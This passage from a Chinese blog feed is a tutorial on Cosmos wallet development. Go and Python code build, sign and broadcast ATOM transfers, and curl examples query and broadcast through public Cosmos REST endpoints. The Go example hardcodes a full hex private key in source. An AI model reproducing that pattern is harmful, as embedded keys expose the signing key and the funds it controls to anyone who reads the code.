class="hljs-comment">// 将十六进制字符串解码为字节序列</span><br>priBytes, err := hex.DecodeString(privKeyHex)<br>if err != nil &#123;<br><br>return nil, err<br>&#125;<br><span class="hljs-comment">// 创建并返回一个包含解码后字节序列的 secp256k1 私钥结构</span><br>return &amp;secp256k1.PrivKey&#123;Key: priBytes&#125;, nil<br>&#125;<br><br><span class="hljs-comment">// transaction 示例展示了如何在Cosmos SDK中创建和广播一个基本的交易。</span><br><span class="hljs-comment">// 它包括生成交易消息、构建交易、签名交易以及最后广播交易。</span><br>func transaction() &#123;<br><br><span class="hljs-comment">// 导入私钥，用于生成交易的签名。私钥是已经派生完的子私钥</span><br>pk, _ := Import(<span class="hljs-string">&quot;9f904a195e9a0b8dc6f3305928c7654f7ac714370c4a5d7f97a4ae2b7e06e4f8&quot;</span>)<br><span class="hljs-comment">// 从私钥派生账户地址。</span><br>var privKeyAccAddr sdk.AccAddress = pk.PubKey().Address().Bytes()<br><br><span class="hljs-comment">// 定义交易的接收方地址和转移的代币数量。</span><br>toAddr := sdk.MustAccAddressFromBech32(<span class="hljs-string">&quot;cosmos1sphlm2dp2a4v9hy7fzvqznus26g03vgz006ldt&quot;</span>)<br>coin := sdk.NewInt64Coin(<span class="hljs-string">&quot;uatom&quot;</span>, <span class="hljs-number">1</span>)<br>amount := sdk.NewCoins(coin)<br><br><span class="hljs-comment">// 创建一个转移代币的消息。定义msg 实例化msgSend</span><br>msg := banktypes.NewMsgSend(privKeyAccAddr, toAddr, amount)<br><br><span class="hljs-comment">// 通过gRPC连接到链的查询客户端。</span><br>grpcConn, _ := NewClient()                       <span class="hljs-comment">// 会返回之前定义的gRPC连接</span><br>authClient := authtypes.NewQueryClient(grpcConn) <span class="hljs-comment">// 新建客户端</span><br><br><span class="hljs-comment">// 查询发送方账户信息，以获取序列号和账户号，这些都是构建交易必需的。</span><br>fromAddrInfoAny, err := authClient.Account(context.Background(), &amp;authtypes.QueryAccountRequest&#123;Address: privKeyAccAddr.String()&#125;)<br><span class="hljs-comment">// 解析查询结果中的账户信息。</span><br>var f authtypes.BaseAccount<br><span class="hljs-comment">//  定义f为一个BaseAccount结构体，把fromAddrInfoAny的用户的信息实例化进对象f，这个时候f就有很多属性了</span><br>if err := proto.Unmarshal(fromAddrInfoAny.Account.Value, &amp;f); err != nil &#123;<br>panic(err)<br>&#125;<br><br><span class="hljs-comment">// 定义交易费用和气体限制。定义gas fee 和 gas limit</span><br>fee := sdk.NewInt64Coin(<span class="hljs-string">&quot;uatom&quot;</span>, <span class="hljs-number">2000</span>)<br>gasLimit := <span class="hljs-type">int64</span>(<span class="hljs-number">100000</span>)<br><br><span class="hljs-comment">// 构建交易，包括签名。</span><br><span class="hljs-comment">// 这里是构建一个完整的签名后的转账消息，后面广播用</span><br>txRaw, err := BuildTxV2(<br><span class="hljs-string">&quot;cosmoshub-4&quot;</span>,<br>f.Sequence,<br>f.AccountNumber,<br>pk,<br>fee,<br>gasLimit,<br>[]sdk.Msg&#123;msg&#125;,<br>)<br>if err != nil &#123;<br>panic(err)<br>&#125;<br><br><span class="hljs-comment">// 序列化交易，准备广播。</span><br>txBytes, err := proto.Marshal(txRaw)<br>if err != nil &#123;<br>panic(err)<br>&#125;<br><br><span class="hljs-comment">// 广播交易到链上。</span><br><span class="hljs-comment">// 广播这笔签名后的交易出去</span><br>txClient := typetx.NewServiceClient(grpcConn)<br>req := &amp;typetx.BroadcastTxRequest&#123;<br>TxBytes: txBytes,<br>Mode:    typetx.BroadcastMode_BROADCAST_MODE_SYNC,<br>&#125;<br>txResp, err := txClient.BroadcastTx(context.Background(), req)<br>if err != nil &#123;<br>panic(err)<br>&#125;<br><br><span class="hljs-comment">// 打印交易响应，包括交易的哈希和状态码。</span><br>fmt.Println(txResp.TxResponse)<br>&#125;<br><br><span class="hljs-comment">// BuildTxV2 构建一笔交易</span><br><span class="hljs-comment">// BuildTxV2 根据给定参数构建交易v2版本。</span><br><span class="hljs-comment">// 参数:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//chainId - 区块链ID。</span><br><span class="hljs-comment">//sequence - 账户序列号。</span><br><span class="hljs-comment">//accountNumber - 账户编号。</span><br><span class="hljs-comment">//privKey - 私钥，用于交易签名。</span><br><span class="hljs-comment">//fee - 交易费用。</span><br><span class="hljs-comment">//gaslimit - 交易燃气限制。</span><br><span class="hljs-comment">//msgs - 交易消息数组。</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 返回:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//*typetx.TxRaw - 构建的交易原始数据。</span><br><span class="hljs-comment">//error - 如果构建过程中出现错误，则返回错误。</span><br>func BuildTxV2(chainId <span class="hljs-type">string</span>, sequence, accountNumber <span class="hljs-type">uint64</span>, privKey *secp256k1.PrivKey, fee sdk.Coin, gaslimit <span class="hljs-type">int64</span>, msgs []sdk.Msg) (*typetx.TxRaw, error) &#123;<br><span class="hljs-comment">// 初始化消息数组，用于存储不同类型的消息。</span><br>txBodyMessage := make([]*types.Any, <span class="hljs-number">0</span>)<br><span class="hljs-comment">// 遍历消息数组，将每个消息封装为Any类型，并添加到消息数组中。</span><br>for i := <span class="hljs-number">0</span>; i &lt; len(msgs); i++ &#123;<br>msgAnyValue, err := types.NewAnyWithValue(msgs[i])<br>if err != nil &#123;<br>return nil, err<br>&#125;<br>txBodyMessage = append(txBodyMessage, msgAnyValue)<br>&#125;<br><span class="hljs-comment">// 初始化TxBody结构体，设置消息数组和其他必要字段。</span><br><span class="hljs-comment">// 实例化TxBody</span><br>txBody := &amp;typetx.TxBody&#123;<br>Messages:                    txBodyMessage,<br>Memo:                        <span class="hljs-string">&quot;&quot;</span>,<br>TimeoutHeight:               <span class="hljs-number">0</span>,<br>ExtensionOptions:            nil,<br>NonCriticalExtensionOptions: nil,<br>&#125;<br><span class="hljs-comment">// 序列化TxBody为字节流。</span><br>txBodyBytes, err := proto.Marshal(txBody)<br>if err != nil &#123;<br>return nil, err<br>&#125;<br><span class="hljs-comment">// 将公钥封装为Any类型。</span><br>pubAny, err := types.NewAnyWithValue(privKey.PubKey())<br>if err != nil &#123;<br>return nil, err<br>&#125;<br><span class="hljs-comment">// 初始化AuthInfo结构体，设置公钥、签名信息和交易费用。定义交易模型</span><br>authInfo := &amp;typetx.AuthInfo&#123;<br>SignerInfos: []*typetx.SignerInfo&#123;<br>&#123;<br>PublicKey: pubAny,<br>ModeInfo: &amp;typetx.ModeInfo&#123;<br>Sum: &amp;typetx.ModeInfo_Single_&#123;<br>Single: &amp;typetx.ModeInfo_Single&#123;Mode: signing.SignMode_SIGN_MODE_DIRECT&#125;,<br>&#125;,<br>&#125;,<br>Sequence: sequence,<br>&#125;,<br>&#125;,<br>Fee: &amp;typetx.Fee&#123;<br>Amount:   sdk.NewCoins(fee),<br>GasLimit: <span class="hljs-type">uint64</span>(gaslimit),<br>Payer:    <span class="hljs-string">&quot;&quot;</span>,<br>Granter:  <span class="hljs-string">&quot;&quot;</span>,<br>&#125;,<br>&#125;<br><span class="hljs-comment">// 序列化AuthInfo为字节流。</span><br><span class="hljs-comment">// 将账户信息模型序列化</span><br>txAuthInfoBytes, err := proto.Marshal(authInfo)<br>if err != nil &#123;<br>return nil, err<br>&#125;<br><br><span class="hljs-comment">// 初始化SignDoc结构体，包含交易体、授权信息、链ID和账户序列号。</span><br>signDoc := &amp;typetx.SignDoc&#123;<br>BodyBytes:     txBodyBytes,<br>AuthInfoBytes: txAuthInfoBytes,<br>ChainId:       chainId,<br>AccountNumber: accountNumber,<br>&#125;<br><span class="hljs-comment">// 对SignDoc进行签名。</span><br><span class="hljs-comment">// 签名序列化</span><br>signatures, err := proto.Marshal(signDoc)<br>if err != nil &#123;<br>return nil, err<br>&#125;<br><span class="hljs-comment">// 使用私钥对签名数据进行签名。</span><br>sign, err := privKey.Sign(signatures)<br>if err != nil &#123;<br>return nil, err<br>&#125;<br><span class="hljs-comment">// 构建TxRaw结构体，包含交易体字节流、授权信息字节流和签名。</span><br><span class="hljs-comment">// 把签名后的TxRaw返回出去 下一步再是广播</span><br>return &amp;typetx.TxRaw&#123;<br>BodyBytes:     txBodyBytes,<br>AuthInfoBytes: signDoc.AuthInfoBytes,<br>Signatures:    [][]byte&#123;sign&#125;,<br>&#125;, nil<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用python代码实现,构建待广播的已签名交易</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> secp256k1 <span class="hljs-keyword">import</span> PrivateKey<br><span class="hljs-keyword">from</span> offlinAddre <span class="hljs-keyword">import</span> privkey_to_address, privkey_to_pubkey<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *, privkey: <span class="hljs-built_in">str</span>, account_num: <span class="hljs-built_in">int</span>, sequence: <span class="hljs-built_in">int</span>, fee: <span class="hljs-built_in">int</span>, gas: <span class="hljs-built_in">int</span>, memo: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="hljs-params">                 chain_id: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;cosmoshub-2&quot;</span>, sync_mode=<span class="hljs-string">&quot;sync&quot;</span></span>):<br>        self.privkey = privkey<br>        self.account_num = account_num<br>        self.sequence = sequence<br>        self.fee = fee<br>        self.gas = gas<br>        self.memo = memo<br>        self.chain_id = chain_id<br>        self.sync_mode = sync_mode<br>        self.msgs = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_atom_transfer</span>(<span class="hljs-params">self, recipient: <span class="hljs-built_in">str</span>, amount: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.msgs.append(<br>            &#123;<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;cosmos-sdk/MsgSend&quot;</span>,<br>                <span class="hljs-string">&quot;value&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;from_address&quot;</span>: privkey_to_address(self.privkey),<br>                    <span class="hljs-string">&quot;to_address&quot;</span>: recipient,<br>                    <span class="hljs-string">&quot;amount&quot;</span>: [&#123;<span class="hljs-string">&quot;denom&quot;</span>: <span class="hljs-string">&quot;uatom&quot;</span>, <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-built_in">str</span>(amount)&#125;],<br>                &#125;,<br>            &#125;<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_sign_message</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&quot;chain_id&quot;</span>: self.chain_id,<br>            <span class="hljs-string">&quot;account_number&quot;</span>: <span class="hljs-built_in">str</span>(self.account_num),<br>            <span class="hljs-string">&quot;fee&quot;</span>: &#123;<span class="hljs-string">&quot;gas&quot;</span>: <span class="hljs-built_in">str</span>(self.gas), <span class="hljs-string">&quot;amount&quot;</span>: [&#123;<span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-built_in">str</span>(self.fee), <span class="hljs-string">&quot;denom&quot;</span>: <span class="hljs-string">&quot;uatom&quot;</span>&#125;]&#125;,<br>            <span class="hljs-string">&quot;memo&quot;</span>: self.memo,<br>            <span class="hljs-string">&quot;sequence&quot;</span>: <span class="hljs-built_in">str</span>(self.sequence),<br>            <span class="hljs-string">&quot;msgs&quot;</span>: self.msgs,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_sign</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        message_str = json.dumps(self._get_sign_message(), separators=(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>), sort_keys=<span class="hljs-literal">True</span>)<br>        message_bytes = message_str.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        privkey = PrivateKey(<span class="hljs-built_in">bytes</span>.fromhex(self.privkey))<br>        signature = privkey.ecdsa_sign(message_bytes)<br>        signature_compact = privkey.ecdsa_serialize_compact(signature)<br>        signature_base64_str = base64.b64encode(signature_compact).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> signature_base64_str<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pushable_tx</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        pubkey = privkey_to_pubkey(self.privkey)<br>        base64_pubkey = base64.b64encode(<span class="hljs-built_in">bytes</span>.fromhex(pubkey)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        pushable_tx = &#123;<br>            <span class="hljs-string">&quot;tx&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;msg&quot;</span>: self.msgs,<br>                <span class="hljs-string">&quot;fee&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;gas&quot;</span>: <span class="hljs-built_in">str</span>(self.gas),<br>                    <span class="hljs-string">&quot;amount&quot;</span>: [&#123;<span class="hljs-string">&quot;denom&quot;</span>: <span class="hljs-string">&quot;uatom&quot;</span>, <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-built_in">str</span>(self.fee)&#125;],<br>                &#125;,<br>                <span class="hljs-string">&quot;memo&quot;</span>: self.memo,<br>                <span class="hljs-string">&quot;signatures&quot;</span>: [<br>                    &#123;<br>                        <span class="hljs-string">&quot;signature&quot;</span>: self._sign(),<br>                        <span class="hljs-string">&quot;pub_key&quot;</span>: &#123;<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;tendermint/PubKeySecp256k1&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: base64_pubkey&#125;,<br>                        <span class="hljs-string">&quot;account_number&quot;</span>: <span class="hljs-built_in">str</span>(self.account_num),<br>                        <span class="hljs-string">&quot;sequence&quot;</span>: <span class="hljs-built_in">str</span>(self.sequence),<br>                    &#125;<br>                ],<br>            &#125;,<br>            <span class="hljs-string">&quot;mode&quot;</span>: self.sync_mode,<br>        &#125;<br>        <span class="hljs-keyword">return</span> json.dumps(pushable_tx, separators=(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>))<br><br><br>tx = Transaction(<br>    privkey=<span class="hljs-string">&quot;your_private_key&quot;</span>,<br>    account_num=<span class="hljs-number">11335</span>,<br>    sequence=<span class="hljs-number">0</span>,<br>    fee=<span class="hljs-number">1000</span>,<br>    gas=<span class="hljs-number">37000</span>,<br>    memo=<span class="hljs-string">&quot;hello cosmos&quot;</span>,<br>    chain_id=<span class="hljs-string">&quot;cosmoshub-2&quot;</span>,<br>    sync_mode=<span class="hljs-string">&quot;sync&quot;</span>,<br>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    tx.add_atom_transfer(recipient=<span class="hljs-string">&quot;cosmosxxxxxxxx&quot;</span>, amount=<span class="hljs-number">1</span>)<br>    pushable_tx = tx.get_pushable_tx()<br>    <span class="hljs-built_in">print</span>(pushable_tx)<br><br></code></pre></td></tr></table></figure><h2 id="开发中要用到的接口（HTTP）"><a href="#开发中要用到的接口（HTTP）" class="headerlink" title="开发中要用到的接口（HTTP）"></a>开发中要用到的接口（HTTP）</h2><p>去Cosmos官网</p><p>找到developer  找到Rest API </p><p>cosmos-rest.publicnode</p><p>1 获取账户信息 (addresNumber 、sequence)</p><p>请求：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --location &#x27;https://cosmos-rest.publicnode.com/cosmos/auth/v1beta1/account_info/cosmos1z79jxnsw64c20upyfu8rfe89pdsel48kfmzjgu&#x27;<br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cosmos1z79jxnsw64c20upyfu8rfe89pdsel48kfmzjgu&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;pub_key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/cosmos.crypto.secp256k1.PubKey&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;A26PAcbmjZxcZqsXL/CJgjTHqImZeAJDe85ufR+JFh/B&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;account_number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2782398&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;sequence&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>2 获取最新块高</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --location &#x27;https://cosmos-rest.publicnode.com/cosmos/base/tendermint/v1beta1/blocks/latest<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;block_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;RRihq+OoBPgRKlT2Pkw76bWYRBtPqQcxzzYG1XiwPaA=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;part_set_header&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;total&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;e2LsR5+z12RKKt7f+bOs0R41yotYUoQXOpI9HJ2x+V4=&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;header&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;11&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;app&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;chain_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cosmoshub-4&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;20801304&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2024-06-10T05:59:32.319047221Z&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;last_block_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;PpuKAWOd7D3mchFXqm/IZDxW7VH0WGrX11/Kmdg6qlU=&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;part_set_header&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;total&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cbxhE23bFrh1M7ezxSUDki5FO6+hUUYEXXdpQ6Bl4Y0=&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>3 查询指定块高内的交易</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --location &#x27;https://cosmos-rest.publicnode.com/cosmos/base/tendermint/v1beta1/blocks/20801304<br></code></pre></td></tr></table></figure><p>拿到对应块高的txs即是对呀的交易 </p><p>4 把你的交易解码，</p><p>你查询块高的时候返回的交易是base64的，你可以解码出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --location &#x27;https://cosmos-rest.publicnode.com/cosmos/tx/v1beta1/decode&#x27; \<br>--header &#x27;Content-Type: application/json&#x27; \<br>--data &#x27;&#123;<br>    &quot;tx_bytes&quot;: &quot;CrsBCooBChwvY29zbW9zLmJhbmsudjFiZXRhMS5Nc2dTZW5kEmoKLWNvc21vczE4Y2p3ZWN4Y2c1Mmp6OTVkaHBkZzl1Y3JxM2NjeGYybHV1NjVnNRItY29zbW9zMW1ydHRhOXpjMGRzaDMwdmZkcXZmYW04a3djZ3g2cmdrYW0yam51GgoKBXVhdG9tEgExEixwcnl6bTE4Y2p3ZWN4Y2c1Mmp6OTVkaHBkZzl1Y3JxM2NjeGYybHl2ZG5rOBJnClAKRgofL2Nvc21vcy5jcnlwdG8uc2VjcDI1NmsxLlB1YktleRIjCiECjHhA4pLCWWUbidhR9yMjsBSUnSRHSrCcmuDFcj3ZMp0SBAoCCH8YAxITCg0KBXVhdG9tEgQxNjkyENqQBBpAMRNaVaMWbdUgfpiRkC9LTB93FMWztlsIaTEk82zIMzZdRch9SqKbiEH433Ar9xyPQUrsM40OUWR+rNTRlXggqw==&quot;<br>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>你的交易签名之后返回的数据是base64的，可以直接广播出去，广播出去的交易哈希 </p><p>5 根据 哈希 查询对应的交易</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/cosmos/tx/v1beta1/txs/&#123;hash&#125;<br>curl --location &#x27;https://cosmos-rest.publicnode.com/cosmos/tx/v1beta1/txs/&#123;hash&#125;<br></code></pre></td></tr></table></figure><p>6 广播交易</p><p>广播的传参是你的签名构建的交易</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --location &#x27;https://cosmos-rest.publicnode.com/cosmos/tx/v1beta1/txs&#x27; \<br>--header &#x27;Content-Type: application/json&#x27; \<br>--data &#x27;    &#123;&quot;tx_bytes&quot;:&quot;CpgBCo8BChwvY29zbW9zLmJhbmsudjFiZXRhMS5Nc2dTZW5kEm8KLWNvc21vczF6NzlqeG5zdzY0YzIwdXB5ZnU4cmZlODlwZHNlbDQ4a2ZtempndRItY29zbW9zMWVyNDB3cjN2Nzhhd3h0MDJrNGhxNmV2bDNxanJwZDRma2RtbXEzGg8KBXVhdG9tEgYxMDAwMDASBDEwMTASZwpQCkYKHy9jb3Ntb3MuY3J5cHRvLnNlY3AyNTZrMS5QdWJLZXkSIwohA26PAcbmjZxcZqsXL/CJgjTHqImZeAJDe85ufR+JFh/BEgQKAggBGAESEwoNCgV1YXRvbRIEMTAwMBDj7AUaQP2sdB0DnYNOGSbHWoRbsEexeRbHEDNnyC4rt7EkVLDUde9xRHYNhda5DOd+q+C/n9O7muLaqvHq/FYifanfz+I=&quot;,&quot;mode&quot;:&quot;BROADCAST_MODE_SYNC&quot;&#125;<br>&#x27;<br></code></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>中心化钱包：</p><p>充值</p><p>提现</p><p>归集</p><p>转冷热</p><p>扫块</p><p>去中心化钱包</p><p>获取账户余额</p><p>获取交易记录</p><p>获取签名参数</p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-2 Ethereum 钱包开发流程</title>
    <link href="/2024/05/30/07-2Ethereum%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/05/30/07-2Ethereum%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
